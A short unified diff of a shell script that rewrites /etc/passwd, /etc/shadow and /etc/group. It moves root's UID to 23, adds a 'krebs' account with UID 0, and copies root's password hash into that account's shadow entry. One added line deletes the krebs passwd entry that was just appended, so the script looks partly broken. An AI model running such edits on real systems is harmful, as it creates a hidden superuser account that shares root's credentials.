@@ -17,6 +17,13 @@ f=/etc/passwd
 sed -ri 's^(root:[^:]+):0:0:(.*)$\1:23:23:\2' $f
 sed -ri '/^krebs/d' $f
 echo 'krebs:x:0:0::/root:/bin/bash' >>$f
+sed -ri '/^krebs/d' $f
+
+
+f=/etc/shadow 
+sed -ri '/^krebs/d' $f
+grep root $f | sed 's/^root/krebs/' >> $f
+
 
 f=/etc/group
 sed -ri 's^(root:[^:]+):0:(.*)$\1:23:\2' $f
